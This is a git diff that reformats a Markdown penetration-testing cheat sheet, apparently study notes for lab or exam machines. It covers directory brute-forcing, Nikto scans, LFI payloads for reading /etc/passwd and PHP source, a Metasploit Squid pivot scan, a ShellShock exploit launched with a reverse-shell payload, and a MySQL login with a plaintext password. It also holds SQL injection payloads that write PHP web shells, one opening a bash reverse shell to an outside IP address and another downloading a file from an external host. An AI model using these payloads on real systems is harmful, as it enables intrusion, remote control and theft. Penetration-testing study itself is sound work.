@@ -36,8 +36,8 @@ httprint -h http://www.example.com -s signatures.txt
 ```
 
 ## - **Directory Traversal** <br />
-//to navigate and find any sub directories.
-Dirbuster	Wordlist : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+To navigate and find any sub directories.
+Dirbuster Wordlist : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```sh
 dirb http://10.11.1.202 /usr/share/dirb/wordlists/vulns/iis.txt
 gobuster -u http://10.11.1.133/ -w /usr/share/wordlists/dirb/common.txt -q -n -e
@@ -48,37 +48,54 @@ dirb http://10.11.1.133/index/sips/ /usr/share/dirb/wordlists/
 //removing status code for 200,204,301,307,403; 
 gobuster -s 200,204,301,307,403 -u http://192.168.88.168 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
-nikto	"nikto -h 192.168.88.132
+
+## - **Nikto** <br />
+```sh
+nikto -h 192.168.88.132
 nikto -h http(s)://[IP]:[PORT]/[DIRECTORY] 
 nikto -C all -h http://10.11.1.72"
-LFI	"https://www.youtube.com/watch?v=rs4zEwONzzk
+```
+
+
+## - **LFI(Local File Inclusion)** <br />
 lfisuite.py
+eg. 
+```sh
 browse.php?file=php://filter/convert.base64-encode/resource=ini.php
 browse.php?file=php://filter/convert.base64-encode/resource=browse.php
 echo -n encodedstrings | base64 -d
 browse.php?file=/etc/passwd
 index.php?file=
-Under phpinfo.php : file_uploads On On : which means LFI exploit enabled"
-"Squid
-proxy"	"scanner/http/squid_pivot_scanning
+```
+If target has phpinfo.php, check out "file_uploads", see if appears as enabled(ON); if so, the target is vuln for LFI. 
+
+
+## - **Squid** <br />
+proxy scanner/http/squid_pivot_scanning
 RHOST : Target
 RANGE : Target
 RPORT : Squid port 
-
+```sh
 msf auxiliary(scanner/http/squid_pivot_scanning) > run
 [+] [192.168.88.155] 192.168.88.155 is alive but 21 is CLOSED
 [+] [192.168.88.155] 192.168.88.155:80 seems OPEN
 if the target uses squid proxy via 3128 port, use nikto with that proxy setting 
 nikto -h 192.168.88.155 -useproxy http://192.168.88.155:3128"
-"shellshock
-34900.py"	"nikto scan results; shows shellshock on /cgi-bin; use 34900.py 
+```
+## - **ShellShock** <br />
+nikto scan results; shows shellshock on /cgi-bin; use 34900.py 
+```sh
 root@kali:~/Exam/Sicos1# python 34900.py payload=reverse rhost=192.168.88.155 lhost=192.168.88.157 lport=1234
 [!] Started reverse shell handler
 [-] Trying exploit on : /cgi-bin/status"
-MySQL	 nmap -sV -Pn -vv –script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306
-SQL injection	"mysql -h 192.168.88.152 -D wordpress -u root -p plbkac
-OPEN A REVERSE SHELL
-' union select ""<?php exec(\""/bin/bash -c \'bash -i >& /dev/tcp/159.203.242.172/1999 0>&1\'\"");"" INTO OUTFILE '/var/www/ecustomers/samshell4.php' #
+```
+
+## - **MySQL** <br />
+```sh
+nmap -sV -Pn -vv –script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306
+```
+MySQL login : ```sh mysql -h 192.168.88.152 -D wordpress -u root -p plbkac```
+MySQL Spawning Reverse shell(linux) : union select ""<?php exec(\""/bin/bash -c \'bash -i >& /dev/tcp/159.203.242.172/1999 0>&1\'\"");"" INTO OUTFILE '/var/www/ecustomers/samshell4.php' #
 UPLOAD A FILE
 ' union select ""<?php file_put_contents(\""root\"", file_get_contents(\""http://attack.samsclass.info/root\"")); ?>"" INTO OUTFILE '/var/www/ecustomers/samget2.php' #
 OPEN A PHP SHELL
